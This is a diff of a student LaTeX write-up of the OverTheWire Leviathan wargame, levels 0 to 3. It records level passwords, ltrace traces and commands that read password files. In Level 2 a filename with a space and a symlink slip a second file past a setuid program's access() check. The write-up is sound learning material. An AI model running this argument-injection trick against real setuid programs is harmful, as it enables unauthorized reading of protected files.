@@ -19,32 +19,6 @@
 \textwidth=6in
 \textheight=8in
 
-\definecolor{codegreen}{rgb}{0,0.6,0}
-\definecolor{codegray}{rgb}{0.5,0.5,0.5}
-\definecolor{codepurple}{rgb}{0.58,0,0.82}
-\definecolor{backcolor}{rgb}{0.95,0.95,0.95}
-
-\lstset{
-  backgroundcolor=\color{backcolor}, % Set background color
-  commentstyle=\color{codegreen}, % Style for comments
-  keywordstyle=\color{magenta}, % Style for keywords
-  numberstyle=\tiny\color{codegray}, % Style for line numbers
-  stringstyle=\color{codepurple}, % Style for strings
-  basicstyle=\ttfamily\footnotesize, % Basic font style and size
-  breakatwhitespace=false, % Don't break lines at whitespace only
-  breaklines=true, % Enable line breaking
-  captionpos=b, % Caption position (bottom)
-  keepspaces=true, % Keep spaces
-  numbers=left, % Show line numbers on the left
-  numbersep=5pt, % Separation of numbers from code
-  showspaces=false, % Don't show spaces as visible characters
-  showstringspaces=false, % Don't show spaces in strings
-  showtabs=false, % Don't show tabs as visible characters
-  tabsize=2, % Tab size
-  language=Python % Specify the language
-}
-
-
 \begin{document}
 \hfill\vbox{\hbox{Jude Shin, Torrey Zachs}
 		\hbox{CSC 321, Section 07}	
@@ -65,55 +39,55 @@ All the code can be found in our remote \href{https://github.com/jude-shin/CSC\_
 \subsection*{Level 0}
 ssh into the first level with user as \verb|leviathan0| and \verb|leviathan0| as the password.
 
-\begin{verbatim}
+\begin{lstlisting}
 ssh -p 2223 leviathan0@leviathan.labs.overthewire.org
-\end{verbatim}
+\end{lstlisting}
 
 \subsection*{Level 0 -> Level 1}
 Password: 3QJ3TgzHDq
 I used the command \verb|ls -al| to try and see all of the contents in the current directory. There was an odd file called .backup with a .html file in it. Inside the file I looked for a keyword "password" and sure enough there was a section with the following contents:
 
-\begin{verbatim}
+\begin{lstlisting}
 <DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is 3QJ3TgzHDq" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
-\end{verbatim}
+\end{lstlisting}
 
 \subsection*{Level 1 -> Level 2}
 Password:NsN1HwFoyN
 I used the command \verb|ls -al| to try and see all of the contents in the current directory. There was a file called \verb|check|. \verb|file check| produced the following information:
 
-\begin{verbatim}
+\begin{lstlisting}
 check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=990fa9b7d511205601669835610d587780d0195e, for GNU/Linux 3.2.0, not stripped
-\end{verbatim}
+\end{lstlisting}
 
 It looks like it is an executable. Running the executable \verb|./check| gave a prompt asking for a password. Putting the wrong password results in nothing, and it notifies us about it. I bet there is a static variable that it is checking. I want to see if this was written in c or compiled with gdb flags. \verb|gdb| did not give any debug flags.
 
 I wonder if I can overflow the buffer (if it was static). I typed a very long password, and then it said that \verb|aaaaaaaaaaa [...] aaaaaaaaaaaaa command not found|. I think at a certain point it will execute a command. I don't know what permissions it will have, but hopefully I am doing something right. I am going to try and find the stopping point which the input stops being a password input and starts being a command. The following input gives the output \verb|Command 'aaa' not found, do you mean ...|
 
-\begin{verbatim}
+\begin{lstlisting}
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-\end{verbatim}
+\end{lstlisting}
 
 So the following command should overflow something, and execute an arbitrary command:
 
-\begin{verbatim}
+\begin{lstlisting}
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaals
-\end{verbatim}
+\end{lstlisting}
 
 The ls command worked! I wonder if I can assume permissions of leviathan2 now. I remember that the /etc/bandit\_pass had the passwords that were protected per user.
 
-\begin{verbatim}
+\begin{lstlisting}
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacat /etc/leviathan_pass/leviathan2
-\end{verbatim}
+\end{lstlisting}
 
 Nope. the permission was still denied. I don't really know what I can do with executing commands. There has to be more that I can do with this buffer overflow. Any commands that I execute is just the same as me executing them directly from the terminal. What if I recursively call the \verb|.check| command?
 
-\begin{verbatim}
+\begin{lstlisting}
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa./check
-\end{verbatim}
+\end{lstlisting}
 
 I wonder if there is a different command other than gdb that can trace the code that is being executed. I googled this and found ltrace. Lets run that on \verb|ltrace .check|. The output is the following:
 
-\begin{verbatim}
+\begin{lstlisting}
 leviathan1@leviathan:~$ ltrace ./check
 __libc_start_main(0x80490ed, 1, 0xffffd454, 0 <unfinished ...>
 printf("password: ")                                                                                     = 10
@@ -125,16 +99,133 @@ strcmp("aaa", "sex")                                                            
 puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
 )                                                                     = 29
 +++ exited (status 0) +++
-\end{verbatim}
+\end{lstlisting}
 
 It seems like \verb|strcmp()| is looking to see if the word compares with "sex". Once I use this for the password, I get to a shell. I am assuming that I have privilege to see the /etc/leviathan\_pass/leviathan2. \verb|cat /etc/leviathan_pass/leviathan2| outputs the password!
 
 
 \subsection*{Level 2 -> Level 3}
-Password:
+Password:f0n8h2iWLP
+I am starting again with the \verb|ls -al| command to try and see all of the contents in the current directory. There was a file called \verb|printfile|. \verb|file printfile| produced the following information:
+
+\begin{lstlisting}
+printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=79cfa8b87bb611f9cf6d6865010709e2ba5c8e3f, for GNU/Linux 3.2.0, not stripped
+\end{lstlisting}
+
+Running the file \verb|./printfile| tells me to have one of the parameters to be \verb|filename|. I tried \verb|./printfile /etc/leviathan_pass/leviathan3| and it said \verb|you can't have that file...|. I guess that would have been too easy. Lets try running \verb|ltrace| with this executable to see what libraries are called.The results are shown below:
+
+\begin{lstlisting}
+leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
+__libc_start_main(0x80490ed, 2, 0xffffd444, 0 <unfinished ...>
+access("/etc/leviathan_pass/leviathan3", 4)                                                              = -1
+puts("You cant have that file..."You cant have that file...
+)                                                                       = 27
++++ exited (status 1) +++
+\end{lstlisting}
+
+I want to know what the \verb|access()| command does, because it seems to open that file with that command. \verb|man access| just checks if the person has the correct permissions. Lets try running the \verb|printfile| command on a file that I have access to. \verb|./printfile printfile| sends out some strange output that reformats the screen. I think this is because this is a binary executable with no good utf-8 encoding for the bytes in it. Lets make a text file in a temporary directory and run the file on it. 
+
+\begin{lstlisting} 
+$ mktemp -d
+/tmp/tmp.pUAosgVyRa
+$ touch /tmp/tmp.pUAosgVyRa/test.txt
+$ echo "Hello World!" > /tmp/tmp.pUAosgVyRa/test.txt
+$ ./printfile /tmp/tmp.pUAosgVyRa/test.txt
+/bin/cat: /tmp/tmp.pUAosgVyRa/test.txt: Permission denied
+\end{lstlisting}
+
+It is interesting that the permission is denied from the command \verb|cat|. I am guessing that the script calls some sort of \verb|exec()| family of commands. That uses the command \verb|cat|. I am going to see what \verb|ltrace ./printfile /tmp/tmp.pUAosgVyRa/test.txt| shows me. The results are shown below:
+
+\begin{lstlisting} 
+leviathan2@leviathan:~$ ltrace ./printfile /tmp/tmp.pUAosgVyRa/test.txt
+__libc_start_main(0x80490ed, 2, 0xffffd454, 0 <unfinished ...>
+access("/tmp/tmp.pUAosgVyRa/test.txt", 4)                                                                = 0
+snprintf("/bin/cat /tmp/tmp.pUAosgVyRa/tes"..., 511, "/bin/cat %s", "/tmp/tmp.pUAosgVyRa/test.txt")      = 37
+geteuid()                                                                                                = 12002
+geteuid()                                                                                                = 12002
+setreuid(12002, 12002)                                                                                   = 0
+system("/bin/cat /tmp/tmp.pUAosgVyRa/tes"...Hello World!
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                   = 0
++++ exited (status 0) +++
+\end{lstlisting}
+
+I still don't know why I am getting an error on the \verb|cat| command. The parent and child should take on the same permissions as the caller. Just calling \verb|cat /tmp/tmp.pUAosgVyRa/test.txt| works just fine. Ah, but \verb|setreuid| changes the effective child processes user id. It looks like the ruid and the euid are both 12002. I want to know if there is a command that can do a reverse lookup for a uid on a system. I am going to google this. Apparently \verb|id -nu UID| finds this out. 
+
+\begin{lstlisting}
+leviathan2@leviathan:~$ id -nu 12002
+leviathan2
+\end{lstlisting}
+
+Well, that is not helpful. I wonder if we can somehow overflow the buffer to change the integer from leviathan2 to leviathan3. By sheer luck, I tried 12003 instead of uid 12002, and it was leviathan3!
+
+\begin{lstlisting}
+leviathan2@leviathan:~$ id -nu 12003
+leviathan3
+\end{lstlisting}
+
+So if I can somehow overflow this value to change to whatever file I want, then I can effectively \verb|cat /etc/leviathan_pass/leviathan3| and get my password. I am guessing that the two \verb|geteuid()| are the values that are used. I wonder if there is a way to change the uid that is retrieved from the command \verb|getuid|. I am off to the manpages. Nothing interesting came from that rabbit hole. 
+I don't know why they used the \verb|system| call. It is weird how they put the command to be executed in quotes. Arguments are passed through spaces in the terminal, so I wonder if we are able to pass in a filename with a space in it. That will execute the \verb|cat file_one file_two|, even if out input is really "file\_one file\_two". I ran the following commands to see if I can bypass that first \verb|access| command. I'm thinking that if the single filename (that may or may not have a space in it) is made by me, then I could successfully pass the \verb|access| command, but the cat command will still treat the entries as two separate files.
+
+\begin{lstlisting} 
+$ touch "/tmp/tmp.pUAosgVyRa/foo /etc/leviathan_pass/leviathan3"
+$ ./printfile /tmp/tmp.pUAosgVyRa/foo /etc/leviathan_pass/leviathan3
+\end{lstlisting}
+
+I guess this doesn't work because I can't have the \verb|\| in the filename. What if I create a symlink to the \verb|/etc/leviathan_pass/leviathan3| file, and then use that with the space separated filename. 
+
+\begin{lstlisting} 
+$ cd /tmp/tmp.pUAosgVyRa
+$ ln -s /etc/leviathan_pass/leviathan3 pd 
+$ touch foo
+$ ./printfile "/tmp/tmp.pUAosgVyRa/foo pd"
+\end{lstlisting}
+
+I can't even seem to use /bin/cat on any file in a temp directory. It works with files like \verb|.bashrc| and even the \verb|printfile|, but not with any file in the temp directory. I am just going to make my own directory in the \verb|/tmp| directory. Here are the results of me trying to link the files again. Success! The second file that was delimited by a blank space linked to the actual password file.
+
+\begin{lstlisting}
+leviathan2@leviathan:/tmp/jude$ ls
+hello.txt
+leviathan2@leviathan:/tmp/jude$ ~/printfile hello.txt
+Hello World!
+leviathan2@leviathan:/tmp/jude$ ln -s /etc/leviathan_pass/leviathan3 /tmp/jude/foo
+leviathan2@leviathan:/tmp/jude$ touch "hello foo"
+leviathan2@leviathan:/tmp/jude$ ls
+foo  hello foo  hello.txt
+leviathan2@leviathan:/tmp/jude$ ls -al
+total 500
+drwxrwxr-x    2 leviathan2 leviathan2   4096 Oct 30 04:23 .
+drwxrwx-wt 6097 root       root       499712 Oct 30 04:23 ..
+lrwxrwxrwx    1 leviathan2 leviathan2     30 Oct 30 04:22 foo -> /etc/leviathan_pass/leviathan3
+-rw-rw-r--    1 leviathan2 leviathan2      0 Oct 30 04:23 hello foo
+-rw-rw-r--    1 leviathan2 leviathan2     13 Oct 30 04:21 hello.txt
+leviathan2@leviathan:/tmp/jude$ ~/printfile "hello foo"
+/bin/cat: hello: No such file or directory
+f0n8h2iWLP
+leviathan2@leviathan:/tmp/jude$
+\end{lstlisting}
+
+It seems like when I use \verb|mktemp -d|, there were permissions that did not allow for the \verb|~/printfile| to access it's files under that directory. 
+
 
 \subsection*{Level 3 -> Level 4}
 Password:
+I am starting again with the same commands as before to see what I have to work with in this level. 
+
+\begin{lstlisting}
+leviathan3@leviathan:~$ ls -al
+total 40
+drwxr-xr-x   2 root       root        4096 Oct 14 09:27 .
+drwxr-xr-x 150 root       root        4096 Oct 14 09:29 ..
+-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
+-rw-r--r--   1 root       root        3851 Oct 14 09:19 .bashrc
+-r-sr-x---   1 leviathan4 leviathan3 18100 Oct 14 09:27 level3
+-rw-r--r--   1 root       root         807 Mar 31  2024 .profile
+leviathan3@leviathan:~$ file level3
+level3: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5f6860c1ad35cc89c2397be07b3684c8b6222d84, for GNU/Linux 3.2.0, with debug_info, not stripped
+\end{lstlisting}
+
 
 \subsection*{Level 4 -> Level 5}
 Password:
